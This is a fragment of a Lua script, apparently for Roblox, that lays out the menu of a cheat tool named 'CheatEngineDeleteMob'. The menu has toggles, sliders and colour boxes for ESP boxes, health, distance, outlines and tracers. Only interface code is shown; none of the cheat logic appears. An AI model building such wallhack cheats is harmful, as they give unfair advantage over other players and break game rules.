    UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_2.Padding = UDim.new(0, 5)
    
    BBE.Name = "BBE"
    BBE.Parent = ESPSection
    BBE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    BBE.BorderColor3 = Color3.fromRGB(255, 255, 255)
    BBE.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    BBE.Size = UDim2.new(0, 164, 0, 29)
    BBE.Font = Enum.Font.Gotham
    BBE.Text = "Box"
    BBE.TextColor3 = Color3.fromRGB(255, 255, 255)
    BBE.TextSize = 16.000
    
    BBN.Name = "BBN"
    BBN.Parent = ESPSection
    BBN.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    BBN.BorderColor3 = Color3.fromRGB(255, 255, 255)
    BBN.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    BBN.Size = UDim2.new(0, 164, 0, 29)
    BBN.Font = Enum.Font.Gotham
    BBN.Text = "Name"
    BBN.TextColor3 = Color3.fromRGB(255, 255, 255)
    BBN.TextSize = 16.000
    -- Made By Mick Gordon
    BBD.Name = "BBD"
    BBD.Parent = ESPSection
    BBD.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    BBD.BorderColor3 = Color3.fromRGB(255, 255, 255)
    BBD.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    BBD.Size = UDim2.new(0, 164, 0, 29)
    BBD.Font = Enum.Font.Gotham
    BBD.Text = "Distance"
    BBD.TextColor3 = Color3.fromRGB(255, 255, 255)
    BBD.TextSize = 16.000
    
    BBH.Name = "BBH"
    BBH.Parent = ESPSection
    BBH.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    BBH.BorderColor3 = Color3.fromRGB(255, 255, 255)
    BBH.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    BBH.Size = UDim2.new(0, 164, 0, 29)
    BBH.Font = Enum.Font.Gotham
    BBH.Text = "Health"
    BBH.TextColor3 = Color3.fromRGB(255, 255, 255)
    BBH.TextSize = 16.000
    
    BTC.Name = "BBE"
    BTC.Parent = ESPSection
    BTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    BTC.BorderColor3 = Color3.fromRGB(255, 255, 255)
    BTC.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    BTC.Size = UDim2.new(0, 164, 0, 29)
    BTC.Font = Enum.Font.Gotham
    BTC.Text = "Team Check"
    BTC.TextColor3 = Color3.fromRGB(255, 255, 255)
    BTC.TextSize = 16.000
    
    TextLabel_5.Parent = ESPSection
    TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_5.BackgroundTransparency = 1.000
    TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_5.BorderSizePixel = 0
    TextLabel_5.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_5.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_5.Font = Enum.Font.Gotham
    TextLabel_5.Text = "Health Type"
    TextLabel_5.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_5.TextSize = 21.000
    -- Made By Mick Gordon
    BBHT.Name = "BBHT"
    BBHT.Parent = ESPSection
    BBHT.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    BBHT.BorderColor3 = Color3.fromRGB(255, 255, 255)
    BBHT.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    BBHT.Size = UDim2.new(0, 164, 0, 29)
    BBHT.Font = Enum.Font.Gotham
    BBHT.Text = "BAR, text, both"
    BBHT.TextColor3 = Color3.fromRGB(255, 255, 255)
    BBHT.TextSize = 16.000
    
    TextLabel_6.Parent = ESPSection
    TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_6.BackgroundTransparency = 1.000
    TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_6.BorderSizePixel = 0-- Made By Mick Gordon
    TextLabel_6.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_6.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_6.Font = Enum.Font.Gotham
    TextLabel_6.Text = "Box Color"
    TextLabel_6.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_6.TextSize = 21.000
    
    TextLabel_7.Parent = ESPSection
    TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_7.BackgroundTransparency = 1.000
    TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_7.BorderSizePixel = 0
    TextLabel_7.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_7.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_7.Font = Enum.Font.Gotham
    TextLabel_7.Text = "R,G,B"
    TextLabel_7.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_7.TextSize = 21.000
    
    Frame_3.Parent = ESPSection
    Frame_3.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_3.BorderSizePixel = 0
    Frame_3.Position = UDim2.new(0.0909090936, 0, 0.600000739, 0)
    Frame_3.Size = UDim2.new(0, 100, 0, 30)
    
    UIListLayout_3.Parent = Frame_3
    UIListLayout_3.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_3.VerticalAlignment = Enum.VerticalAlignment.Center
    UIListLayout_3.Padding = UDim.new(0, 5)
    
    Box_R.Name = "Box_R"
    Box_R.Parent = Frame_3
    Box_R.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Box_R.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Box_R.Size = UDim2.new(0, 75, 0, 24)
    Box_R.ClearTextOnFocus = false
    Box_R.Font = Enum.Font.Gotham
    Box_R.PlaceholderText = "255 - 0"
    Box_R.Text = "75"
    Box_R.TextColor3 = Color3.fromRGB(255, 255, 255)
    Box_R.TextSize = 14.000
    
    Box_G.Name = "Box_G"
    Box_G.Parent = Frame_3
    Box_G.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Box_G.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Box_G.Size = UDim2.new(0, 75, 0, 24)
    Box_G.ClearTextOnFocus = false
    Box_G.Font = Enum.Font.Gotham
    Box_G.PlaceholderText = "255 - 0"
    Box_G.Text = "0" 
    Box_G.TextColor3 = Color3.fromRGB(255, 255, 255)
    Box_G.TextSize = 14.000
    -- Made By Mick Gordon
    Box_B.Name = "Box_B"
    Box_B.Parent = Frame_3
    Box_B.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Box_B.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Box_B.Size = UDim2.new(0, 75, 0, 24)
    Box_B.ClearTextOnFocus = false
    Box_B.Font = Enum.Font.Gotham
    Box_B.PlaceholderText = "255 - 0"
    Box_B.Text = "10"
    Box_B.TextColor3 = Color3.fromRGB(255, 255, 255)
    Box_B.TextSize = 14.000
    
    TextLabel_8.Parent = DeleteMobF
    TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_8.BackgroundTransparency = 1.000
    TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_8.BorderSizePixel = 0
    TextLabel_8.Position = UDim2.new(0.215919182, 0, 0.100655407, 0)
    TextLabel_8.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_8.Font = Enum.Font.Gotham
    TextLabel_8.Text = "ESP"
    TextLabel_8.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_8.TextSize = 18.000
    TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left
    
    ESPSection_2.Name = "ESPSection"
    ESPSection_2.Parent = DeleteMobF
    ESPSection_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ESPSection_2.BackgroundTransparency = 1.000
    ESPSection_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    ESPSection_2.BorderSizePixel = 0
    ESPSection_2.Position = UDim2.new(0.475963563, 0, 0.160724282, 0)
    ESPSection_2.Size = UDim2.new(0, 100, 0, 334)
    
    UIListLayout_4.Parent = ESPSection_2
    UIListLayout_4.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_4.Padding = UDim.new(0, 5)
    
    OE.Name = "OE"
    OE.Parent = ESPSection_2
    OE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    OE.BorderColor3 = Color3.fromRGB(255, 255, 255)
    OE.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    OE.Size = UDim2.new(0, 164, 0, 29)
    OE.Font = Enum.Font.Gotham
    OE.Text = "Outlines"
    OE.TextColor3 = Color3.fromRGB(255, 255, 255)
    OE.TextSize = 16.000
    
    OTC.Name = "OTC"
    OTC.Parent = ESPSection_2
    OTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    OTC.BorderColor3 = Color3.fromRGB(255, 255, 255)
    OTC.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    OTC.Size = UDim2.new(0, 164, 0, 29)
    OTC.Font = Enum.Font.Gotham
    OTC.Text = "Team Check"
    OTC.TextColor3 = Color3.fromRGB(255, 255, 255)
    OTC.TextSize = 16.000
    
    Frame_4.Parent = ESPSection_2
    Frame_4.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_4.BackgroundTransparency = 0.700
    Frame_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_4.BorderSizePixel = 0
    Frame_4.Position = UDim2.new(-0.550000012, 0, 0.739130437, 0)
    Frame_4.Size = UDim2.new(0, 230, 0, 50)
    
    Slider1.Name = "Slider1"
    Slider1.Parent = Frame_4
    Slider1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Slider1.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Slider1.BorderSizePixel = 0
    Slider1.Position = UDim2.new(0.0629399866, 0, 0.45120728, 0)
    Slider1.Size = UDim2.new(0, 200, 0, 15)
    
    UICorner_5.Parent = Slider1
    
    Fill3.Name = "Fill3"
    Fill3.Parent = Slider1
    Fill3.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    Fill3.BackgroundTransparency = 0.200
    Fill3.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Fill3.BorderSizePixel = 0
    Fill3.Size = UDim2.new(0, 100, 0, 15)
    -- Made By Mick Gordon
    UICorner_6.Parent = Fill3
    
    UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.29, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.43, Color3.fromRGB(18, 218, 249)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(52, 52, 52))}
    UIGradient_3.Parent = Fill3
    
    TriggerOutTans.Name = "TriggerOutTans"
    TriggerOutTans.Parent = Slider1
    TriggerOutTans.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TriggerOutTans.BackgroundTransparency = 1.000
    TriggerOutTans.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TriggerOutTans.BorderSizePixel = 0
    TriggerOutTans.Size = UDim2.new(1, 0, 1, 0)
    TriggerOutTans.Font = Enum.Font.SourceSans
    TriggerOutTans.Text = ""
    TriggerOutTans.TextColor3 = Color3.fromRGB(0, 0, 0)
    TriggerOutTans.TextSize = 14.000
    
    Numbers_3.Name = "Numbers"
    Numbers_3.Parent = Frame_4
    Numbers_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_3.BackgroundTransparency = 1.000
    Numbers_3.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_3.BorderSizePixel = 0
    Numbers_3.Position = UDim2.new(0.79130435, 0, 0, 0)
    Numbers_3.Size = UDim2.new(0, 50, 0, 23)
    Numbers_3.Font = Enum.Font.Gotham
    Numbers_3.Text = "50"
    Numbers_3.TextColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_3.TextSize = 14.000
    
    TextLabel_9.Parent = Frame_4
    TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_9.BackgroundTransparency = 1.000
    TextLabel_9.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_9.BorderSizePixel = 0
    TextLabel_9.Position = UDim2.new(0.0608695634, 0, 0, 0)
    TextLabel_9.Size = UDim2.new(0, 125, 0, 23)
    TextLabel_9.Font = Enum.Font.Gotham
    TextLabel_9.Text = "Outlines Transparency"
    TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_9.TextSize = 14.000
    
    Frame_5.Parent = ESPSection_2
    Frame_5.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_5.BackgroundTransparency = 0.700
    Frame_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_5.BorderSizePixel = 0
    Frame_5.Position = UDim2.new(-0.550000012, 0, 0.739130437, 0)
    Frame_5.Size = UDim2.new(0, 230, 0, 50)
    
    Slider2.Name = "Slider2"
    Slider2.Parent = Frame_5
    Slider2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Slider2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Slider2.BorderSizePixel = 0
    Slider2.Position = UDim2.new(0.0629399866, 0, 0.45120728, 0)
    Slider2.Size = UDim2.new(0, 200, 0, 15)
    
    UICorner_7.Parent = Slider2
    
    Fill4.Name = "Fill4"
    Fill4.Parent = Slider2
    Fill4.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    Fill4.BackgroundTransparency = 0.200
    Fill4.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Fill4.BorderSizePixel = 0
    Fill4.Size = UDim2.new(0, 100, 0, 15)
    -- Made By Mick Gordon
    UICorner_8.Parent = Fill4
    
    UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.29, Color3.fromRGB(17, 223, 255)), ColorSequenceKeypoint.new(0.43, Color3.fromRGB(18, 218, 249)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(52, 52, 52))}
    UIGradient_4.Parent = Fill4
    
    TriggerFill.Name = "TriggerFill"
    TriggerFill.Parent = Slider2
    TriggerFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TriggerFill.BackgroundTransparency = 1.000
    TriggerFill.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TriggerFill.BorderSizePixel = 0
    TriggerFill.Size = UDim2.new(1, 0, 1, 0)
    TriggerFill.Font = Enum.Font.SourceSans
    TriggerFill.Text = ""
    TriggerFill.TextColor3 = Color3.fromRGB(0, 0, 0)
    TriggerFill.TextSize = 14.000
    
    Numbers_4.Name = "Numbers"
    Numbers_4.Parent = Frame_5
    Numbers_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_4.BackgroundTransparency = 1.000
    Numbers_4.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_4.BorderSizePixel = 0
    Numbers_4.Position = UDim2.new(0.79130435, 0, 0, 0)
    Numbers_4.Size = UDim2.new(0, 50, 0, 23)
    Numbers_4.Font = Enum.Font.Gotham
    Numbers_4.Text = "50"
    Numbers_4.TextColor3 = Color3.fromRGB(255, 255, 255)
    Numbers_4.TextSize = 14.000
    
    TextLabel_10.Parent = Frame_5
    TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_10.BackgroundTransparency = 1.000
    TextLabel_10.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_10.BorderSizePixel = 0
    TextLabel_10.Position = UDim2.new(0.104347825, 0, 0, 0)
    TextLabel_10.Size = UDim2.new(0, 133, 0, 23)
    TextLabel_10.Font = Enum.Font.Gotham
    TextLabel_10.Text = "Fill Outlines Transparency"
    TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_10.TextSize = 14.000
    -- Made By Mick Gordon
    TextLabel_11.Parent = ESPSection_2
    TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_11.BackgroundTransparency = 1.000
    TextLabel_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_11.BorderSizePixel = 0
    TextLabel_11.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_11.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_11.Font = Enum.Font.Gotham
    TextLabel_11.Text = "Outlines"
    TextLabel_11.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_11.TextSize = 21.000
    
    Frame_6.Parent = ESPSection_2
    Frame_6.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_6.BorderSizePixel = 0
    Frame_6.Position = UDim2.new(0.0909090936, 0, 0.600000739, 0)
    Frame_6.Size = UDim2.new(0, 100, 0, 30)
    
    UIListLayout_5.Parent = Frame_6
    UIListLayout_5.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout_5.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_5.VerticalAlignment = Enum.VerticalAlignment.Center
    UIListLayout_5.Padding = UDim.new(0, 5)
    
    Outlines_R.Name = "Outlines_R"
    Outlines_R.Parent = Frame_6
    Outlines_R.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Outlines_R.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Outlines_R.Size = UDim2.new(0, 75, 0, 24)
    Outlines_R.ClearTextOnFocus = false
    Outlines_R.Font = Enum.Font.Gotham
    Outlines_R.PlaceholderText = "255 - 0"
    Outlines_R.Text = "255"
    Outlines_R.TextColor3 = Color3.fromRGB(255, 255, 255)
    Outlines_R.TextSize = 14.000
    
    Outlines_G.Name = "Outlines_G"
    Outlines_G.Parent = Frame_6
    Outlines_G.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Outlines_G.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Outlines_G.Size = UDim2.new(0, 75, 0, 24)
    Outlines_G.ClearTextOnFocus = false
    Outlines_G.Font = Enum.Font.Gotham
    Outlines_G.PlaceholderText = "255 - 0"
    Outlines_G.Text = "255"
    Outlines_G.TextColor3 = Color3.fromRGB(255, 255, 255)
    Outlines_G.TextSize = 14.000
    
    Outlines_B.Name = "Outlines_B"
    Outlines_B.Parent = Frame_6
    Outlines_B.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Outlines_B.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Outlines_B.Size = UDim2.new(0, 75, 0, 24)
    Outlines_B.ClearTextOnFocus = false
    Outlines_B.Font = Enum.Font.Gotham
    Outlines_B.PlaceholderText = "255 - 0"
    Outlines_B.Text = "255"
    Outlines_B.TextColor3 = Color3.fromRGB(255, 255, 255)
    Outlines_B.TextSize = 14.000
    -- Made By Mick Gordon
    TextLabel_12.Parent = ESPSection_2
    TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_12.BackgroundTransparency = 1.000
    TextLabel_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_12.BorderSizePixel = 0
    TextLabel_12.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_12.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_12.Font = Enum.Font.Gotham
    TextLabel_12.Text = "Fill Outlines"
    TextLabel_12.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_12.TextSize = 21.000
    
    Frame_7.Parent = ESPSection_2
    Frame_7.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_7.BorderSizePixel = 0
    Frame_7.Position = UDim2.new(0.0909090936, 0, 0.600000739, 0)
    Frame_7.Size = UDim2.new(0, 100, 0, 30)
    
    UIListLayout_6.Parent = Frame_7
    UIListLayout_6.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout_6.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_6.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_6.VerticalAlignment = Enum.VerticalAlignment.Center
    UIListLayout_6.Padding = UDim.new(0, 5)
    
    FillOutlines_R.Name = "FillOutlines_R"
    FillOutlines_R.Parent = Frame_7
    FillOutlines_R.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    FillOutlines_R.BorderColor3 = Color3.fromRGB(255, 255, 255)
    FillOutlines_R.Size = UDim2.new(0, 75, 0, 24)
    FillOutlines_R.ClearTextOnFocus = false
    FillOutlines_R.Font = Enum.Font.Gotham
    FillOutlines_R.PlaceholderText = "255 - 0"
    FillOutlines_R.Text = "255"
    FillOutlines_R.TextColor3 = Color3.fromRGB(255, 255, 255)
    FillOutlines_R.TextSize = 14.000
    
    FillOutlines_G.Name = "FillOutlines_G"
    FillOutlines_G.Parent = Frame_7
    FillOutlines_G.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    FillOutlines_G.BorderColor3 = Color3.fromRGB(255, 255, 255)
    FillOutlines_G.Size = UDim2.new(0, 75, 0, 24)
    FillOutlines_G.ClearTextOnFocus = false
    FillOutlines_G.Font = Enum.Font.Gotham
    FillOutlines_G.PlaceholderText = "255 - 0"
    FillOutlines_G.Text = "255"
    FillOutlines_G.TextColor3 = Color3.fromRGB(255, 255, 255)
    FillOutlines_G.TextSize = 14.000
    
    FillOutlines_B.Name = "FillOutlines_B"
    FillOutlines_B.Parent = Frame_7
    FillOutlines_B.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    FillOutlines_B.BorderColor3 = Color3.fromRGB(255, 255, 255)
    FillOutlines_B.Size = UDim2.new(0, 75, 0, 24)
    FillOutlines_B.ClearTextOnFocus = false
    FillOutlines_B.Font = Enum.Font.Gotham
    FillOutlines_B.PlaceholderText = "255 - 0"
    FillOutlines_B.Text = "255"
    FillOutlines_B.TextColor3 = Color3.fromRGB(255, 255, 255)
    FillOutlines_B.TextSize = 14.000
    -- Made By Mick Gordon
    Tracerssection.Name = "Tracers section"
    Tracerssection.Parent = DeleteMobF
    Tracerssection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Tracerssection.BackgroundTransparency = 1.000
    Tracerssection.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Tracerssection.BorderSizePixel = 0
    Tracerssection.Position = UDim2.new(0.682779849, 0, 0.158000082, 0)
    Tracerssection.Size = UDim2.new(0, 100, 0, 334)
    
    UIListLayout_7.Parent = Tracerssection
    UIListLayout_7.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_7.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_7.Padding = UDim.new(0, 5)
    
    TE.Name = "TE"
    TE.Parent = Tracerssection
    TE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    TE.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TE.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    TE.Size = UDim2.new(0, 164, 0, 29)
    TE.Font = Enum.Font.Gotham
    TE.Text = "Tracers"
    TE.TextColor3 = Color3.fromRGB(255, 255, 255)
    TE.TextSize = 16.000
    
    TTC.Name = "TTC"
    TTC.Parent = Tracerssection
    TTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    TTC.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TTC.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    TTC.Size = UDim2.new(0, 164, 0, 29)
    TTC.Font = Enum.Font.Gotham
    TTC.Text = "Team Check"
    TTC.TextColor3 = Color3.fromRGB(255, 255, 255)
    TTC.TextSize = 16.000
    
    TTCOlor.Name = "TTCOlor"
    TTCOlor.Parent = Tracerssection
    TTCOlor.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    TTCOlor.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TTCOlor.Position = UDim2.new(0.234439835, 0, 0.139479905, 0)
    TTCOlor.Size = UDim2.new(0, 164, 0, 29)
    TTCOlor.Font = Enum.Font.Gotham
    TTCOlor.Text = "Team Color"
    TTCOlor.TextColor3 = Color3.fromRGB(255, 255, 255)
    TTCOlor.TextSize = 16.000
    
    Frame_8.Parent = Tracerssection
    Frame_8.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Frame_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_8.BorderSizePixel = 0
    Frame_8.Position = UDim2.new(0.0909090936, 0, 0.600000739, 0)
    Frame_8.Size = UDim2.new(0, 100, 0, 40)
    
    UIListLayout_8.Parent = Frame_8
    UIListLayout_8.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout_8.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_8.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_8.VerticalAlignment = Enum.VerticalAlignment.Center
    UIListLayout_8.Padding = UDim.new(0, 5)
    
    Tracers_R.Name = "Tracers_R"
    Tracers_R.Parent = Frame_8
    Tracers_R.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Tracers_R.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Tracers_R.Size = UDim2.new(0, 75, 0, 24)
    Tracers_R.ClearTextOnFocus = false
    Tracers_R.Font = Enum.Font.Gotham
    Tracers_R.PlaceholderText = "255 - 0"
    Tracers_R.Text = "75" 
    Tracers_R.TextColor3 = Color3.fromRGB(255, 255, 255)
    Tracers_R.TextSize = 14.000
    
    Tracers_G.Name = "Tracers_G"
    Tracers_G.Parent = Frame_8
    Tracers_G.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Tracers_G.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Tracers_G.Size = UDim2.new(0, 75, 0, 24)
    Tracers_G.ClearTextOnFocus = false
    Tracers_G.Font = Enum.Font.Gotham
    Tracers_G.PlaceholderText = "255 - 0"
    Tracers_G.Text = "0"
    Tracers_G.TextColor3 = Color3.fromRGB(255, 255, 255)
    Tracers_G.TextSize = 14.000
    
    Tracers_B.Name = "Tracers_B"
    Tracers_B.Parent = Frame_8
    Tracers_B.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
    Tracers_B.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Tracers_B.Size = UDim2.new(0, 75, 0, 24)
    Tracers_B.ClearTextOnFocus = false
    Tracers_B.Font = Enum.Font.Gotham
    Tracers_B.PlaceholderText = "255 - 0"
    Tracers_B.Text = "10"
    Tracers_B.TextColor3 = Color3.fromRGB(255, 255, 255)
    Tracers_B.TextSize = 14.000
    -- Made By Mick Gordon
    Unknown.Name = "Unknown"
    Unknown.Parent = DeleteMobF
    Unknown.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Unknown.BackgroundTransparency = 1.000
    Unknown.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Unknown.BorderSizePixel = 0
    Unknown.Position = UDim2.new(0.882285178, 0, 0.158000082, 0)
    Unknown.Size = UDim2.new(0, 100, 0, 334)
    
    UIListLayout_9.Parent = Unknown
    UIListLayout_9.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout_9.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_9.Padding = UDim.new(0, 5)
    
    TextLabel_13.Parent = Unknown
    TextLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_13.BackgroundTransparency = 1.000
    TextLabel_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_13.BorderSizePixel = 0
    TextLabel_13.Position = UDim2.new(0.0700000003, 0, 0.20869565, 0)
    TextLabel_13.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_13.Font = Enum.Font.Gotham
    TextLabel_13.Text = "More Options"
    TextLabel_13.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_13.TextSize = 21.000
    
    TextLabel_14.Parent = Unknown
    TextLabel_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_14.BackgroundTransparency = 1.000
    TextLabel_14.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_14.BorderSizePixel = 0
    TextLabel_14.Position = UDim2.new(0.215919182, 0, 0.100655407, 0)
    TextLabel_14.Size = UDim2.new(0, 100, 0, 17)
    TextLabel_14.Font = Enum.Font.Gotham
    TextLabel_14.Text = "Later"
    TextLabel_14.TextColor3 = Color3.fromRGB(17, 223, 255)
    TextLabel_14.TextSize = 18.000
    
    Open.Name = "Open"
    Open.Parent = CheatEngineDeleteMob
    Open.BackgroundColor3 = Color3.fromRGB(51, 51, 51)
    Open.BorderColor3 = Color3.fromRGB(255, 255, 255)
    Open.Position = UDim2.new(0.5, 0, 0.0199999996, 0)
    Open.Size = UDim2.new(0, 150, 0, 50)
    Open.ZIndex = 10
    Open.Visible = DeleteMob.GUi.OpenNCloseButton
    Open.Draggable = true
    Open.Active = true
    
    TextButton.Parent = Open
    TextButton.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
    TextButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TextButton.Position = UDim2.new(0, 0, 0.319999933, 0)
    TextButton.Size = UDim2.new(0, 150, 0, 34)
    TextButton.Font = Enum.Font.Gotham
    TextButton.Text = "open / Close"
    TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextButton.TextSize = 14.000
    
